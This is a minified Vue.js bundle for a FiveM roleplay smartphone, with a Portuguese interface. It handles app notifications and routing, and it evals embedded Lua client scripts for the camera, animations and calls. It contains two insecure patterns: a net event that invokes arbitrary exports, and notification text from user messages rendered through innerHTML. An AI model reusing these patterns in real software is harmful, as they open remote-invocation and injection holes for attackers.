            install(e) {
                e.component("RouterLink", Wi), e.component("RouterView", Yi), e.config.globalProperties.$router = this, Object.defineProperty(e.config.globalProperties, "$route", {
                    get: () => ut(i)
                }), Lr && !I && i.value === ai && (I = !0, b(a.location).catch((e => {})));
                const t = {};
                for (let l in ai) t[l] = da((() => i.value[l]));
                e.provide(Tr, this), e.provide(Er, Ze(t)), e.provide(Pr, i);
                let n = e.unmount;
                O.add(e), e.unmount = function() {
                    O.delete(e), O.size < 1 && (C(), i.value = ai, I = !1, A = !1), n()
                }
            }
        }
    }({
        history: ((yO = location.host ? yO || location.pathname + location.search : "").indexOf("#") < 0 && (yO += "#"), ni(yO)),
        routes: vO
    });
var yO;
xO.afterEach((e => _o.pusher.emit("Route:afterEach", e)));
var kO = xO;
const wO = () => kO.currentRoute.value.path,
    CO = new Map;
CO.set("GPS", (({
    location: [e, t]
}) => {
    _o.client.SetNewWaypoint(e, t), _o.addNotification("gps", "GPS", "O destino foi marcado em seu GPS")
})), CO.set("WHATSAPP_MESSAGE", (({
    sender: e,
    group: t,
    content: n,
    image: l,
    location: a
}) => {
    if (e != _o.identity.phone) {
        const s = Bs(e);
        let o = l ? "📷 Foto" : a ? "🌎 Localização" : n;
        o.match(/(http)?s?:?(\/\/[^"']*\.(?:webm|ogg))/) ? o = "🔊 Áudio" : o.length > 40 && (o = o.substr(0, 40) + "..."), t && wO() != `/whatsapp/group${t.id}` ? _o.addNotification("whatsapp", t.name, `<b>${s}:</b> ${o}`) : t || wO() == `/whatsapp/${e}` || _o.addNotification("whatsapp", s, o)
    }
})), CO.set("WHATSAPP_GROUP_KICK", (({
    name: e
}) => _o.addNotification("whatsapp", e, "Você foi removido do grupo"))), CO.set("WHATSAPP_GROUP_DESTROY", (({
    name: e
}) => _o.addNotification("whatsapp", e, "O grupo foi excluído"))), CO.set("INSTAGRAM_NOTIFY", (e => _o.addNotification("instagram", Ys("instagram"), zs(e)))), CO.set("PAYPAL", (({
    sender: e,
    value: t
}) => {
    const n = Bs(e);
    _o.addNotification("paypal", "PayPal", `<b class="text-black">${n}</b> transferiu <b class="text-black">${js(t)}</b> para sua conta`)
})), CO.set("BANK", (({
    sender: e,
    value: t
}) => {
    const n = Bs(e);
    _o.addNotification("bank", Ys("bank"), `<b class="text-black">${n}</b> transferiu <b class="text-black">${js(t)}</b> para sua conta`)
})), CO.set("BANK_NOTIFY", (({
    title: e,
    subtitle: t
}) => _o.addNotification("bank", e, t))), CO.set("BANK_INVOICE", (({
    value: e
}) => _o.addNotification("bank", "Fatura recebida", `Você recebeu uma fatura no valor de ${js(e)}`))), CO.set("BANK_INVOICE_RECEIPT", (({
    value: e,
    name: t
}) => _o.addNotification("bank", `${t} pagou uma fatura`, `Foram creditados ${js(e)} em sua conta`))), CO.set("TINDER_MESSAGE", (({
    sender: e,
    sender_name: t,
    content: n,
    sender_uid: l
}) => {
    l != _o.identity.user_id && wO() != `/tinder/chats/${e}` && _o.addNotification("tinder", t, n)
})), CO.set("TINDER_MATCH", (({
    profile: {
        name: e
    }
}) => _o.addNotification("tinder", "Match!", `Você agora tem um match com ${e}! <i class="fas fa-heart text-red-500"></i>`))), CO.set("TWITTER_NOTIFY", (e => {
    let [t, n] = Array.isArray(e) ? e : [null, e];
    _o.addNotification("twitter", null != t ? t : Ys("twitter"), n)
})), CO.set("TOR_NOTIFY", (e => {
    let [t, n] = Array.isArray(e) ? e : [null, e];
    _o.addNotification("tor", null != t ? t : Ys("tor"), n)
})), CO.set("TOR_MESSAGE", (e => {
    const t = e.channel.startsWith("dm:");
    if ("geral" != e.channel && e.sender != zh.id && wO() !== "/tor/" + (t ? e.sender : e.channel)) {
        const n = e.location ? "🌎 Localização" : e.image ? "📷 Foto" : e.content;
        _o.addNotification("tor", t ? zh.getNickname(e.sender) : "#" + e.channel, n)
    }
})), CO.set("WEAZEL", (e => _o.addNotification("weazel", e.title, e.description))), CO.set("CUSTOM_NOTIFY", (({
    app: e,
    title: t,
    subtitle: n
}) => {
    _o.addNotification(e, t, n)
})), CO.set("SMS", (e => {
    const {
        sender: t,
        content: n,
        image: l,
        location: a
    } = e;
    if (null != e.created_at || (e.created_at = Math.floor(Date.now() / 1e3)), t in _o.messages ? _o.messages[t].push(e) > 100 && _o.messages[t].shift() : _o.messages[t] = [e], _o.hasNotificationFor("sms") && wO() != "/sms/" + t) {
        let e = n.substr(0, 40);
        n.length > 40 && (e += "..."), _o.addNotification("sms", Bs(t), l ? "📷 Foto" : a ? "🌎 Localização" : e)
    }
}));
for (let [sM, oM] of CO.entries()) _o.pusher.on(sM, (e => {
    const t = sM.split("_")[0].toLowerCase();
    (_o.hasNotificationFor(t) || "sms" === t) && oM(e)
}));
var _O = "\nAddEventHandler('onResourceStop', function (name)\n  if name == GetCurrentResourceName() and IsNuiOpen then\n    SetNuiFocus(false)\n  end\nend)\n\nfunction src.exports(script, method, ...)\n  local o = exports[script]\n  o[method](o, ...)\nend\n\nfunction src.takePhoto(onlySelfie)\n  return TakePhotoAndUpload(onlySelfie)\nend\n\nfunction src.getLocation()\n  local c = GetEntityCoords(PlayerPedId())\n  return {c.x,c.y,c.z}\nend\n\nfunction src.setInput(b)\n  SetNuiFocusKeepInput(b)\nend\n\nsrc.SetNewWaypoint = SetNewWaypoint\n\nfunction src.getClock()\n  local hours = GetClockHours()\n  local minutes = GetClockMinutes()\n  if hours < 10 then hours = '0'..hours end\n  if minutes < 10 then minutes = '0'..minutes end\n  \n  return { hours=hours, minutes=minutes }\nend\n\nfunction src.isAlive()\n  return GetEntityHealth(PlayerPedId()) > (MinimumHealth or 101)\nend\n\nfunction src.setState(key, value)\n  LocalPlayer.state[key] = value\nend\n\nCitizen.CreateThread(function()\n  while true do\n    TriggerNuiEvent('pusher', 'TIME', src.getClock())\n    Wait(1000)\n  end\nend)\n\nfunction TriggerNuiEvent(event, ...)\n  local args = {...}\n  SendNUIMessage({ event=event,args=args })\nend\n\nRegisterNetEvent('smartphone:pusher')\nAddEventHandler('smartphone:pusher', function(type, subject)\n  TriggerNuiEvent('pusher', type, subject)\nend)\n\nRegisterCommand('+smartphone-fix', function()\n  SetNuiFocus(IsNuiOpen, IsNuiOpen)\nend)\n\nfunction requestSync(name, ...)\n  local p = promise.new()\n  requestToBackend(name, {...}, function(res)\n    p:resolve(res)\n  end)\n  return Citizen.Await(p)\nend\n\nfunction forceOpen()\n  if not IsNuiOpen then\n    if (GetEntityHealth(PlayerPedId()) > (MinimumHealth or 101) or CanUseDead) and not LocalPlayer.state.disablePhone then\n      local res = requestSync('checkPhone')\n      if requestSync('checkPhone') then\n        src.open()\n      else\n        NoPhoneCallback()\n      end\n    end\n  else\n    SetNuiFocus(true, true)\n  end\nend\n\nexports('forceOpen', forceOpen)\nexports('closeSmartphone', function()\n  TriggerNuiEvent('close')\nend)\nexports('open', src.open)\n\nRegisterCommand('bindSmartphone', function()\n  if (not PhoneKey or PhoneKey == 'k') and not IsControlJustPressed(0, 311) then return end\n  if IsControlPressed(0, 176) or IsControlPressed(0, 25) then return end\n\n  forceOpen()\nend)\n\nRegisterKeyMapping('bindSmartphone', 'Open the smartphone', 'keyboard', _G.PhoneKey or 'k')\n\nDisabledKeys = { 24, 25, 140, 199 }\n\nfunction disarmPlayer()\n\tif DoNotDisarm then\n\t\treturn\n\tend\n\tSetCurrentPedWeapon(PlayerPedId(), GetHashKey(\"WEAPON_UNARMED\"), true)\nend\n\nCitizen.CreateThread(function()\n  while true do\n    local idle = 0\n\n    if IsNuiOpen then\n\t\t\tdisarmPlayer()\n      for k,v in pairs(DisabledKeys) do\n        DisableControlAction(0, v, true)\n      end\n\n      local ped = PlayerPedId()\n\n      if not CanUseDead and (GetEntityHealth(ped) < MinimumHealth or IsPedRagdoll(ped)) then\n        src.close()\n        TriggerNuiEvent('pusher', 'SET_VISIBLE', false)\n        TriggerNuiEvent('pusher', 'FORCE_LEAVE_CALL', true)\n        src.playAnim(false)\n        tryDeleteProp()\n      end\n    else idle = 1000 end\n\n    Wait(idle)\n  end\nend)\n\nif not NoPhoneCallback then\n  _G.NoPhoneCallback = function()\n    TriggerEvent('Notify', 'negado', 'Você não tem <b>CELULAR</b>')\n  end\nend\n\nRegisterNUICallback('keydown', function(data, cb)\n  TriggerNuiEvent('pusher', 'keydown', data.key or data)\n  cb('ok')\nend)\n\nRegisterNUICallback('setDark', function(data, cb)\n  TriggerNuiEvent('pusher', 'setDark', data)\n  cb('ok')\nend)\n\nRegisterNUICallback('prompt', function(data, cb)\n  TriggerNuiEvent('pusher', 'prompt', data)\n  src.fPrompt = cb\nend)\n\nRegisterNUICallback('confirm', function(data, cb)\n  TriggerNuiEvent('pusher', 'confirm', data)\n  src.fConfirm = cb\nend)\n\nRegisterNUICallback('alert', function(data, cb)\n  TriggerNuiEvent('pusher', 'alert', data)\n  cb('ok')\nend)\n\nfunction createSMS(sender, content, attachments)\n  local atype = type(attachments)\n  TriggerNuiEvent('pusher', 'SMS', {\n    sender = sender,\n    content = content,\n    image = (atype == 'string') and attachments or nil,\n    location = (atype == 'table') and attachments or nil\n  })\nend\n\nexports('createSMS', createSMS)\nRegisterNetEvent('smartphone:createSMS')\nAddEventHandler('smartphone:createSMS', createSMS)\n\nexports('createDispatch', function(number, text)\n  local cds = src.getLocation()\n  return requestSync('service_request', number, text, cds)\nend)\n\nRegisterNetEvent('smartphone:exports')\nAddEventHandler('smartphone:exports', function(script, method, ...)\n  local e = exports[script]\n  e[method](e, ...)\nend)\n",
    AO = "\nfunction CellFrontCamActivate(activate)\n  return Citizen.InvokeNative(0x2491A93618B7D838, activate)\nend\n\nScreenshotCallback = nil\n\nRegisterNUICallback('screenshot', function(data, cb)\n  if ScreenshotCallback then\n    ScreenshotCallback()\n    ScreenshotCallback = nil\n  end\n  cb({})\nend)\n\nBlockCameraKeys = false\n\nfunction TakePhotoAndUpload(onlySelfie)\n  local selfie = not not onlySelfie\n\n  if _G.Summerz then executeVRP('removeObjects') end\n\n  ClearPedSecondaryTask(PlayerPedId())\n  ClearPedTasks(PlayerPedId())\n\n  CreateMobilePhone(1)\n  CellCamActivate(true, true)\n\n  isUsingCamera = true\n\n  if selfie then\n    CellFrontCamActivate(true)\n  end\n\n  Wait(500)\n\n  local p = promise.new()\n\n  Citizen.CreateThread(function()\n    local click = false\n\n    while true do\n      HideHudAndRadarThisFrame()\n      if IsControlJustReleased(0, 27) and not onlySelfie then\n        selfie = not selfie\n        CellFrontCamActivate(selfie)\n        Wait(500)\n      elseif IsControlJustReleased(0, 177) then\n        p:resolve(false)\n        break\n      elseif IsControlJustReleased(0, 176) or IsControlJustReleased(0, 38) or IsControlJustReleased(0, 201) then\n        TriggerNuiEvent('pusher', 'CONFIRM_SCREENSHOT')\n        ScreenshotCallback = function()\n          p:resolve(true)\n        end\n        break\n      end\n      Wait(0)\n    end\n  end)\n\n  p:next(function(b)\n    DestroyMobilePhone()\n    CellCamActivate(false, false)\n    isUsingCamera = false\n    if _G.Summerz then PhonePlayText() end\n    return b\n  end)\n\n  return Citizen.Await(p)\nend",
    SO = '\n\nInVideoCall = false\nVC_FirstPerson = true\nVC_Camera = false\n\nfunction DESTROY_VC_CAMERA()\n  if VC_Camera then\n    DestroyMobilePhone()\n    CellCamActivate(false, false)\n    VC_Camera = false\n  end\nend\n\nfunction SetInVideoCall(bool)\n  if Summerz then\n    LocalPlayer["state"]["Active"] = not bool\n  end\n  if bool ~= InVideoCall then\n    InVideoCall = bool\n    if not bool then\n      VC_FirstPerson = true\n      SetFollowPedCamViewMode(1)\n    else\n      CreateThread(function()\n        while InVideoCall do\n          DisableControlAction(0, 0, true)\n          if IsControlJustPressed(1, 27) or (IsPedInAnyVehicle(PlayerPedId()) and not VC_FirstPerson) then\n            VC_FirstPerson = not VC_FirstPerson\n      \n            if VC_FirstPerson then\n              DESTROY_VC_CAMERA()\n            elseif not VC_Camera then\n              VC_Camera = true\n              CreateMobilePhone(1)\n              CellCamActivate(true, true)\n              CellFrontCamActivate(true)\n            end\n          elseif VC_FirstPerson then\n            SetFollowPedCamViewMode(4)\n            SetFollowVehicleCamViewMode(4)\n          end\n          Wait(0)\n        end\n        DESTROY_VC_CAMERA()\n      end)\n    end\n  end\nend\n\nsrc.SetInVideoCall = SetInVideoCall\n',
    RO = '\nfunction executeVRP(name, ...)\n\tTriggerEvent(\'vRP:proxy\', name, {...}, \'smartphone\', -1)\nend\n\n_G.MinimumHealth = _G.MinimumHealth or 101\n\nisUsingCamera = false\ncurrentAnim = false\ncurrentProp = false\n\nif not phoneModel then\n  if Summerz then\n    phoneModel = "prop_npc_phone_02"\n  else\n    phoneModel = "prop_amb_phone"\n  end\nend\n\nfunction playAnim(anim)\n  dict = inCar() and "anim@cellphone@in_car@ps" or "cellphone@"\n  if IsEntityPlayingAnim(PlayerPedId(), dict, anim, 3) then\n    return\n  end\n\n  RequestAnimDict(dict)\n  repeat Wait(10)\n  until HasAnimDictLoaded(dict)\n  TaskPlayAnim(PlayerPedId(), dict, anim, 3.0, 3.0, -1, 50, 0, false, false, false)\n  currentAnim = { dict, anim }\nend\n\nfunction stopAnim()\n  if currentAnim then\n    local dict, anim = table.unpack(currentAnim)\n    StopAnimTask(PlayerPedId(), dict, anim, 1.1)\n  end\n  currentAnim = false\nend\n\nlocal propLock = false\n\nfunction setPhoneProp(bool)\n\tif DisableProp or Summerz then\n\t\treturn\n\tend\n\n  repeat Wait(0)\n  until not propLock\n\n  propLock = true\n\n  if bool then\n    disarmPlayer()\n\n    if DoesEntityExist(currentProp) then\n      tryDeleteProp()\n    end\n\n    local ped = PlayerPedId()\n\n    RequestModel(phoneModel)\n    repeat Wait(50)\n    until HasModelLoaded(phoneModel)\n\n    local mode = requestSync(\'0x00029a\')\n\n    if mode == \'auto\' then\n      local x, y, z = table.unpack(GetEntityCoords(ped))\n      currentProp = CreateObject(phoneModel, x, y, z-1.5, true, true, false)\n    elseif mode then\n      currentProp = NetToEnt(mode)\n    else\n      propLock = false\n      return SetModelAsNoLongerNeeded(phoneModel)\n    end\n    SetEntityCollision(currentProp, false, false)\n    AttachEntityToEntity(currentProp, ped, GetPedBoneIndex(ped, 28422),0.0,0.0,0.0,0.0,0.0,0.0,false,false,false,false,2,true)\n    SetModelAsNoLongerNeeded(phoneModel)\n  elseif currentProp then\n    tryDeleteProp()\n    currentProp = false\n  end\n  propLock = false\nend\n\nfunction inCar()\n  return IsPedInAnyVehicle(PlayerPedId())\nend\n\nanims = {}\n\nfunction anims.close()\n  setPhoneProp(false)\n  Wait(1000)\n  stopAnim()\nend\n\nfunction anims.toText()\n  if Summerz then\n    return executeVRP("createObjects", "cellphone@", "cellphone_text_in", phoneModel, 50, 28422)\n  end\n  playAnim("cellphone_text_in")\nend\n\nfunction anims.toCall()\n  if Summerz then\n\t\treturn executeVRP("createObjects", "cellphone@", "cellphone_text_to_call", phoneModel, 50, 28422)\n  end\n  playAnim("cellphone_text_to_call")\nend\n\nfunction anims.callToText()\n  if Summerz then\n    return executeVRP("createObjects", "cellphone@", "cellphone_call_to_text", phoneModel, 50, 28422)\n  end\n  playAnim("cellphone_call_to_text")\nend\n\nfunction anims.fromCall()\n  if Summerz then\n    return executeVRP(\'removeObjects\', \'one\')\n  end\n  playAnim(inCar() and "cellphone_horizontal_exit" or "cellphone_call_out")\n  anims.close()\nend\n\nfunction anims.fromText()\n  if Summerz then\n    return executeVRP(\'removeObjects\', \'one\')\n  end\n  playAnim("cellphone_text_out")\n  anims.close()\nend\n\nlocal currentLoop\n\nfunction src.playAnim(anim, loop)\n  if type(anim) == \'string\' and anim:match(\'to\') then\n    setPhoneProp(true)\n  end\n\n\tif loop and currentLoop ~= anim and not Summerz then\n\t\tcurrentLoop = anim\n\n\t\tCreateThread(function()\n\t\t\twhile currentLoop == anim and GetEntityHealth(PlayerPedId()) >= MinimumHealth and not isUsingCamera and not InVideoCall do\n\t\t\t\tpcall(anims[anim])\n\t\t\t\tWait(250)\n\t\t\tend\n\t\tend)\n\telseif anim then\n\t\tcurrentLoop = false\n\t\tpcall(anims[anim])\n  elseif anim == false then\n    if Summerz then\n      return executeVRP(\'removeObjects\', \'one\')\n    end\n    currentLoop = false\n    stopAnim()\n  end\nend\n\nfunction tryDeleteProp()\n  while DoesEntityExist(currentProp) do\n    NetworkRequestControlOfEntity(currentProp)\n    DeleteEntity(currentProp)\n    Wait(0)\n  end\nend\n\nAddEventHandler(\'onResourceStop\', function(name)\n  if name == GetCurrentResourceName() then\n\t\tif currentProp then\n\t\t\tsrc.playAnim(false)\n      tryDeleteProp()\n\t\tend\n  end\nend)\n';
if (!_o.localhost) {
    const e = null != (t = globalThis.safeEval) ? t : "eval",
        n = [_O, AO, SO, RO].map((t => _o.client[e](t)));
    Promise.all(n).then((() => {
        _o.client.__clear(), globalThis.safeEval = null
    }))
}
const TO = {
        components: {
            Alert: Ao,
            Confirm: Oo,
            Prompt: Fo,
            Menu: Xo,
            PhotoEditor: tr,
            VideoRecorder: fr
        },
        setup() {
            const e = Qi(),
                t = rt(!0),
                {
                    visible: n,
                    notifications: l,
                    currentCall: a,
                    identity: s
                } = _o,
                o = rt(),
                r = rt(),
                i = rt(),
                c = rt(),
                u = io(),
                d = da((() => _o.settings.case || "iphonex")),
                p = da((() => _o.settings.isAndroid)),
                f = da((() => _o.clock.value.hours + ":" + _o.clock.value.minutes)),
                m = da((() => {
                    var e;
                    return null != (e = _o.settings.notificationsBottom) ? e : "18.5vh"
                })),
                h = rt(),
                b = rt();
            let g = 0;
            if (_o.localhost) {
                n.value = !0;
                const e = document.querySelector("body");
                e.style.backgroundColor = "blue", e.style.backgroundSize = "100vw 100vh"
            }
            const v = e => (t, n = 255) => new Promise((l => {
                if (t.includes("executeVRP")) return l("true");
                e.value = {
                    title: t,
                    max: n,
                    callback: function(t) {
                        l(t), e.value = null
                    }
                }
            }));
            $l("videoCamera", (() => new Promise(((e, t) => {
                b.value = [e, t]
            })).finally((() => b.value = null)))), $l("alert", _o.alert = e => o.value = e), $l("prompt", _o.prompt = v(i)), $l("confirm", _o.confirm = v(r)), $l("setDark", (e => t.value = null != e ? e : _o.darkTheme.value)), _o.fetchSettings(), _o.localhost && _o.created();
            const x = rt(!1);
            Rn(x, (e => _o.client.setInput(e)));
            const y = {
                open() {
                    var e;
                    g = Date.now() + 500, n.value = !0, (null == (e = a.value) ? void 0 : e.accepted) || _o.client.playAnim("toText", !0), _o.client.setState("usingPhone", !0)
                },
                async close() {
                    var t;
                    ["/call", "/"].includes(e.currentRoute.value.path) || e.push("/home"), [o, i, c, r, b].forEach((e => e.value = null)), n.value = !1, x.value = !1, !(null == (t = a.value) ? void 0 : t.accepted) && _o.client.playAnim("fromText"), _o.client.close(), _o.client.setState("usingPhone", !1)
                },
                pusher(e, t) {
                    _o.pusher.emit(e, t)
                }
            };

            function k(t) {
                if (_o.localhost && "k" === t) return void(n.value = !0);
                if (g > Date.now() || "Escape" != t && "Backspace" != t) return;
                if (h.value) return h.value = null;
                let l = "Escape" == t;
                bo().state.request.value = null;
                const a = e.currentRoute.value.path;
                if ("Backspace" === t && !document.querySelector("input:focus,textarea:focus"))
                    if ("/home" == a) l = !0;
                    else if (b.value) b.value = null;
                else if ("/call" != a && "/" != a) return [o, r, i].forEach((e => e.value = null)), e.back();
                l && y.close()
            }
            return _o.pusher.on("REDIRECT", (t => {
                _o.visible.value || _o.client.open(), "/home" != e.currentRoute.value.path && e.replace("/home"), e.push(t)
            })), _o.pusher.on("CALL_REQUEST", (async t => {
                _o.storage.doNotDisturb.value || await _o.client.isAlive() && (t.contact = _o.contacts.value.find((e => e.phone == t.initiator.phone)) || {
                    name: t.isAnonymous ? "Anônimo" : t.initiator.phone,
                    phone: t.initiator.phone
                }, a.value = t, n.value || _o.addNotification(t.isVideo ? "facetime" : "phone", t.isVideo ? "Chamada de Vídeo" : "Chamada de Voz", t.contact.name + " está te ligando"), e.push("/call"))
            })), _o.pusher.on("CALL_TO", ((t, n = !1) => {
                if (t == _o.identity.phone) return o.value = "Você não pode ligar para si mesmo";
                const l = _o.storage.anonymousCall.value;
                _o.backend.createPhoneCall(t, n, l).then((n => {
                    n.error ? o.value = n.error : (n.contact = {
                        name: Bs(t),
                        phone: t
                    }, n.owner = !0, a.value = n, e.push("/call"), _o.visible.value || _o.client.open())
                }))
            })), _o.pusher.on("SET_VISIBLE", (e => n.value = e)), _o.pusher.on("REFRESH", (() => {
                e.replace("/"), _o.identity.phone = null, _o.fetchSettings(), _o.backend.ig_logout()
            })), _o.pusher.on("SERVICE_RESPONSE", (() => o.value = "Seu chamado foi atendido")), _o.pusher.on("SERVICE_REJECT", (() => o.value = "Seu chamado foi rejeitado")), _o.pusher.on("PHONE_CHANGE", (({
                from: e,
                to: t
            }) => {
                var n;
                _o.contacts.value.forEach((n => {
                    n.phone == e && (n.phone = t)
                })), (null == (n = _o.identity) ? void 0 : n.phone) == e && (_o.identity.phone = t)
            })), globalThis.pusher = _o.pusher, _o.localhost && (globalThis.store = _o), $l("useImageFocus", (e => h.value = e)), $l("setKeepInput", (e => x.value = e)), _o.captureMicrophone(), window.addEventListener("message", (({
                data: {
                    event: e,
                    args: t
                }
            }) => {
                var n;
                null == (n = y[e]) || n.call(y, ...t)
            })), window.addEventListener("contextmenu", (() => {
                x.value = !x.value
            })), window.addEventListener("keydown", (({
                key: e
            }) => k(e))), _o.pusher.on("keydown", k), _o.pusher.on("setDark", (e => t.value = e)), _o.pusher.on("prompt", (e => v(i)(e).then((e => _o.client.fPrompt(e))))), _o.pusher.on("confirm", (e => v(r)(e).then((e => _o.client.fConfirm(e))))), _o.pusher.on("alert", (e => o.value = e)), {
                visible: n,
                android: p,
                clock: f,
                alert: o,
                confirm: r,
                prompt: i,
                dark: t,
                menu: c,
                paint: u,
                notifications: l,
                call: a,
                identity: s,
                phonecase: d,
                imageFocused: h,
                notificationsBottom: m,
                recording: b
            }
        }
    },
    EO = sn("data-v-4e81525e");
ln("data-v-4e81525e");
const PO = {
        key: 0,
        class: "notification select-none"
    },
    LO = {
        class: "flex flex-col ml-3"
    },
    IO = Pl("h1", null, "Chamada em andamento", -1),
    OO = {
        class: "flex flex-col ml-3"
    },
    MO = {
        key: 0,
        class: "fixed z-50 w-screen h-screen flex flex-col flex-center select-none",
        style: {
            background: "rgba(0,0,0,0.8)"
        }
    },
    VO = {
        class: "relative"
    },
    DO = {
        class: "bg-gray-900 h-16 rounded-t-3xl"
    },
    UO = Pl("i", {
        class: "fas fa-times text-white text-3xl"
    }, null, -1),
    NO = {
        class: "marvel-device iphone-x"
    },
    $O = {
        class: "screen"
    },
    jO = {
        class: "absolute left-8 z-10"
    },
    FO = {
        class: "font-bold text-xl"
    },
    zO = {
        key: 0,
        class: "relative left-1.5 bottom-0 far fa-location-arrow text-sm"
    },
    BO = {
        class: "absolute right-8 top-5 z-10 flex items-center text-lg"
    },
    HO = Pl("i", {
        class: "fas fa-signal-alt pr-2"
    }, null, -1),
    qO = Pl("i", {
        class: "fas fa-wifi pr-2"
    }, null, -1),
    GO = {
        key: 0,
        class: "far fa-battery-full pr-2"
    };
an();
const WO = EO(((e, t, n, l, a, s) => {
    const o = dl("Alert"),
        r = dl("Prompt"),
        i = dl("Confirm"),
        c = dl("Menu"),
        u = dl("PhotoEditor"),
        d = dl("VideoRecorder"),
        p = dl("router-view");
    return wl(), _l(bl, null, [Pl(Ja, {
        tag: "ul",
        "enter-from-class": "opacity-0 transform translate-y-16",
        "enter-to-class": "opacity-100",
        "leave-from-class": "opacity-100",
        "leave-to-class": "opacity-0 transform translate-x-96",
        "enter-active-class": "transition duration-1000",
        "leave-active-class": "transition duration-1000",
        class: "notifications",
        style: {
            right: l.visible ? "49rem" : "5rem",
            bottom: l.visible ? "6.5rem" : l.notificationsBottom
        }
    }, {
        default: EO((() => [l.call && l.call.accepted && !l.visible ? (wl(), _l("li", PO, [Pl("img", {
            src: e.$asset("/apps/phone.png"),
            class: "w-8 rounded-xl"
        }, null, 8, ["src"]), Pl("div", LO, [IO, Pl("span", null, g(l.call.contact.name), 1)])])) : Ml("", !0), (wl(!0), _l(bl, null, fa(l.notifications, (e => (wl(), _l("li", {
            class: "notification select-none",
            key: e.id
        }, [Pl("img", {
            src: e.icon,
            class: "w-8 rounded-xl"
        }, null, 8, ["src"]), Pl("div", OO, [Pl("h1", null, g(e.title), 1), Pl("span", {
            innerHTML: e.subtitle
        }, null, 8, ["innerHTML"])])])))), 128))])),
        _: 1
    }, 8, ["style"]), l.imageFocused ? (wl(), _l("div", MO, [Pl("div", VO, [Pl("div", DO, [Pl("button", {
        onClick: t[1] || (t[1] = e => l.imageFocused = null),
        class: "block ml-auto p-3 mr-2"
    }, [UO])]), Pl("img", {
        style: {
            "max-height": "80vh",
            "max-width": "50vw"
        },
        src: l.imageFocused
    }, null, 8, ["src"])])])) : Ml("", !0), Pl(Oa, {
        name: "phone"
    }, {
        default: EO((() => [Zn(Pl("div", NO, [Pl("img", {
            class: "case",
            type: l.phonecase,
            src: e.$asset(`/stock/cases/${l.phonecase}.png`)
        }, null, 8, ["type", "src"]), Pl("div", $O, ["/boot" != e.$route.path ? (wl(), _l("div", {
            key: 0,
            class: {
                "text-white": l.dark,
                "text-black": !l.dark
            }
        }, [Pl("div", jO, [Pl("span", FO, g(l.clock), 1), l.android ? Ml("", !0) : (wl(), _l("i", zO))]), Pl("div", BO, [HO, qO, l.android ? Ml("", !0) : (wl(), _l("i", GO))])], 2)) : Ml("", !0), l.alert ? (wl(), _l(o, {
            key: 1,
            content: l.alert
        }, null, 8, ["content"])) : Ml("", !0), l.prompt ? (wl(), _l(r, Nl({
            key: 2
        }, l.prompt), null, 16)) : Ml("", !0), l.confirm ? (wl(), _l(i, {
            key: 3,
            title: l.confirm.title,
            callback: l.confirm.callback
        }, null, 8, ["title", "callback"])) : Ml("", !0), Pl(Oa, {
            name: "menu"
        }, {
            default: EO((() => [Pl(c)])),
            _: 1
        }), l.paint.original ? (wl(), _l(u, {
            key: 4
        })) : Ml("", !0), l.recording ? (wl(), _l(d, {
            key: 5,
            callback: l.recording
        }, null, 8, ["callback"])) : Ml("", !0), Pl(p, {
            key: e.$route.fullPath
        }, {
            default: EO((({
                Component: e
            }) => [(wl(), _l(Fn, {
                include: "WhatsApp"
            }, [Zn((wl(), _l(fl(e), null, null, 512)), [
                [ds, !l.paint.original && !l.recording]
            ])], 1024))])),
            _: 1
        })])], 512), [
            [ds, l.visible]
        ])])),
        _: 1
    })], 64)
}));
TO.render = WO, TO.__scopeId = "data-v-4e81525e";
const KO = {
        props: {
            modelValue: {
                required: !0
            }
        },
        setup: () => ({
            android: _o.settings.isAndroid
        })
    },
    JO = sn("data-v-e073d7c8");
ln("data-v-e073d7c8");
const XO = Pl("i", null, null, -1);
an();
const YO = JO(((e, t, n, l, a, s) => (wl(), _l("label", {
    class: "form-switch",
    android: l.android
}, [Pl("input", {
    type: "checkbox",
    checked: n.modelValue,
    onInput: t[1] || (t[1] = t => e.$emit("update:modelValue", t.target.checked))
}, null, 40, ["checked"]), XO], 8, ["android"]))));
KO.render = YO, KO.__scopeId = "data-v-e073d7c8";
const ZO = {
        props: ["white"],
        setup(e) {
            var t;
            return {
                white: null != (t = _o.darkTheme.value) ? t : e.white
            }
        }
    },
    QO = Ol('<div class="bar1"></div><div class="bar2"></div><div class="bar3"></div><div class="bar4"></div><div class="bar5"></div><div class="bar6"></div><div class="bar7"></div><div class="bar8"></div><div class="bar9"></div><div class="bar10"></div><div class="bar11"></div><div class="bar12"></div>', 12);
ZO.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", {
        class: "loading-spinner",
        style: {
            filter: l.white && "invert(1)"
        }
    }, [QO], 4)
};
const eM = {},
    tM = {
        xmlns: "http://www.w3.org/2000/svg",
        height: "512pt",
        viewBox: "0 0 512 512",
        width: "512pt"
    },
    nM = Pl("path", {
        d: "m256 0c-141.164062 0-256 114.835938-256 256s114.835938 256 256 256 256-114.835938 256-256-114.835938-256-256-256zm0 0",
        fill: "#2196f3"
    }, null, -1),
    lM = Pl("path", {
        d: "m385.75 201.75-138.667969 138.664062c-4.160156 4.160157-9.621093 6.253907-15.082031 6.253907s-10.921875-2.09375-15.082031-6.253907l-69.332031-69.332031c-8.34375-8.339843-8.34375-21.824219 0-30.164062 8.339843-8.34375 21.820312-8.34375 30.164062 0l54.25 54.25 123.585938-123.582031c8.339843-8.34375 21.820312-8.34375 30.164062 0 8.339844 8.339843 8.339844 21.820312 0 30.164062zm0 0",
        fill: "#fafafa"
    }, null, -1);
eM.render = function(e, t) {
    return wl(), _l("svg", tM, [nM, lM])
}, globalThis.GameView = lo;
const aM = ((...e) => {
    const t = (ms || (ms = rl(fs))).createApp(...e),
        {
            mount: n
        } = t;
    return t.mount = e => {
        const l = function(e) {
            if (V(e)) {
                return document.querySelector(e)
            }
            return e
        }(e);
        if (!l) return;
        const a = t._component;
        M(a) || a.render || a.template || (a.template = l.innerHTML), l.innerHTML = "";
        const s = n(l);
        return l instanceof Element && (l.removeAttribute("v-cloak"), l.setAttribute("data-v-app", "")), s
    }, t
})(TO);
aM.component("AppInput", IP), aM.component("AppSelect", OP), aM.component("AppToggle", KO), aM.component("AppLoading", ZO), aM.component("AppVerified", eM), aM.use(kO), aM.config.globalProperties.$filters = qs, aM.config.globalProperties.$asset = e => "https://fivem.jesteriruka.dev/" + e, Object.defineProperty(aM.config.globalProperties, "$currency", {
    get: () => _o.settings.currency
}), aM.mount("#root");